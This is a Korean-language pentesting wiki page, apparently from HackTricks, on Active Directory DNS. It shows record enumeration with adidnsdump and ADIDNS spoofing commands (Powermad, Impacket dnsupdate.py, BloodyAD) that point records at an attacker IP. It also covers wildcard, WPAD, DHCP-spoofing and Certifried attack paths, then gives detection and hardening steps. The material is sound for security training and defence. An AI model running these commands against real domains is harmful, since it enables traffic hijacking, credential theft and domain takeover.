# AD DNS Records

{{#include ../../banners/hacktricks-training.md}}

기본적으로 **Active Directory의 모든 사용자**는 도메인 또는 포리스트 DNS 존에서 **모든 DNS 레코드를 열거**할 수 있으며, 이는 존 전송과 유사합니다 (사용자는 AD 환경에서 DNS 존의 자식 객체를 나열할 수 있습니다).

도구 [**adidnsdump**](https://github.com/dirkjanm/adidnsdump)는 내부 네트워크의 정찰 목적을 위해 존의 **모든 DNS 레코드**를 **열거**하고 **내보내기** 할 수 있게 해줍니다.
```bash
git clone https://github.com/dirkjanm/adidnsdump
cd adidnsdump
pip install .

# Enumerate the default zone and resolve the "hidden" records
adidnsdump -u domain_name\\username ldap://10.10.10.10 -r

# Quickly list every zone (DomainDnsZones, ForestDnsZones, legacy zones,…)
adidnsdump -u domain_name\\username ldap://10.10.10.10 --print-zones

# Dump a specific zone (e.g. ForestDnsZones)
adidnsdump -u domain_name\\username ldap://10.10.10.10 --zone _msdcs.domain.local -r

cat records.csv
```
> adidnsdump v1.4.0 (2025년 4월)은 JSON/Greppable (`--json`) 출력을 추가하고, 다중 스레드 DNS 해상도 및 LDAPS에 바인딩할 때 TLS 1.2/1.3을 지원합니다.

자세한 정보는 [https://dirkjanm.io/getting-in-the-zone-dumping-active-directory-dns-with-adidnsdump/](https://dirkjanm.io/getting-in-the-zone-dumping-active-directory-dns-with-adidnsdump/)를 읽으세요.

---

## 레코드 생성 / 수정 (ADIDNS 스푸핑)

**Authenticated Users** 그룹은 기본적으로 존 DACL에서 **Create Child** 권한을 가지고 있기 때문에, 모든 도메인 계정(또는 컴퓨터 계정)은 추가 레코드를 등록할 수 있습니다. 이는 트래픽 하이재킹, NTLM 릴레이 강제 또는 전체 도메인 손상에 사용될 수 있습니다.

### PowerMad / Invoke-DNSUpdate (PowerShell)
```powershell
Import-Module .\Powermad.ps1

# Add A record evil.domain.local → attacker IP
Invoke-DNSUpdate -DNSType A -DNSName evil -DNSData 10.10.14.37 -Verbose

# Delete it when done
Invoke-DNSUpdate -DNSType A -DNSName evil -DNSData 10.10.14.37 -Delete -Verbose
```
### Impacket – dnsupdate.py  (Python)
```bash
# add/replace an A record via secure dynamic-update
python3 dnsupdate.py -u 'DOMAIN/user:Passw0rd!' -dc-ip 10.10.10.10 -action add -record evil.domain.local -type A -data 10.10.14.37
```
*(dnsupdate.py는 Impacket ≥0.12.0과 함께 제공됩니다)*

### BloodyAD
```bash
bloodyAD -u DOMAIN\\user -p 'Passw0rd!' --host 10.10.10.10 dns add A evil 10.10.14.37
```
---

## 일반적인 공격 원시 요소

1. **와일드카드 레코드** – `*.<zone>`은 AD DNS 서버를 LLMNR/NBNS 스푸핑과 유사한 기업 전체 응답자로 변환합니다. NTLM 해시를 캡처하거나 LDAP/SMB로 릴레이하는 데 악용될 수 있습니다. (WINS 조회가 비활성화되어 있어야 합니다.)
2. **WPAD 하이재킹** – `wpad`를 추가하거나 공격자 호스트를 가리키는 **NS** 레코드를 추가하여 Global-Query-Block-List를 우회하고, 자격 증명을 수집하기 위해 아웃바운드 HTTP 요청을 투명하게 프록시합니다. Microsoft는 와일드카드/DNAME 우회를 패치했지만 (CVE-2018-8320) **NS 레코드는 여전히 작동합니다**.
3. **오래된 항목 인수** – 이전에 워크스테이션에 속했던 IP 주소를 주장하면 관련 DNS 항목이 여전히 해결되어 리소스 기반 제약 위임 또는 Shadow-Credentials 공격을 DNS에 전혀 손대지 않고 수행할 수 있습니다.
4. **DHCP → DNS 스푸핑** – 기본 Windows DHCP+DNS 배포에서 동일한 서브넷의 인증되지 않은 공격자는 위조된 DHCP 요청을 보내 기존 A 레코드(도메인 컨트롤러 포함)를 덮어쓸 수 있습니다. 이는 동적 DNS 업데이트를 트리거합니다 (Akamai “DDSpoof”, 2023). 이는 Kerberos/LDAP에 대한 중간자 공격을 가능하게 하며 전체 도메인 인수로 이어질 수 있습니다.
5. **Certifried (CVE-2022-26923)** – 제어하는 머신 계정의 `dNSHostName`을 변경하고, 일치하는 A 레코드를 등록한 다음, 해당 이름에 대한 인증서를 요청하여 DC를 가장합니다. **Certipy** 또는 **BloodyAD**와 같은 도구는 이 흐름을 완전히 자동화합니다.

---

## 탐지 및 강화

* 민감한 영역에서 **인증된 사용자**에게 *모든 자식 객체 생성* 권한을 거부하고, DHCP에서 사용하는 전용 계정에 동적 업데이트를 위임합니다.
* 동적 업데이트가 필요한 경우, 영역을 **보안 전용**으로 설정하고 DHCP에서 **이름 보호**를 활성화하여 소유자 컴퓨터 객체만 자신의 레코드를 덮어쓸 수 있도록 합니다.
* DNS 서버 이벤트 ID 257/252(동적 업데이트), 770(영역 전송) 및 `CN=MicrosoftDNS,DC=DomainDnsZones`에 대한 LDAP 쓰기를 모니터링합니다.
* 위험한 이름(`wpad`, `isatap`, `*`)을 의도적으로 무해한 레코드로 차단하거나 Global Query Block List를 통해 차단합니다.
* DNS 서버를 패치 상태로 유지합니다 – 예를 들어, RCE 버그 CVE-2024-26224 및 CVE-2024-26231은 **CVSS 9.8**에 도달했으며 도메인 컨트롤러에 대해 원격으로 악용될 수 있습니다.

## 참고 문헌

* Kevin Robertson – “ADIDNS Revisited – WPAD, GQBL and More” (2018, 여전히 와일드카드/WPAD 공격에 대한 사실상의 참고 문헌)
* Akamai – “DHCP DNS 동적 업데이트를 악용한 DNS 레코드 스푸핑” (2023년 12월)
{{#include ../../banners/hacktricks-training.md}}
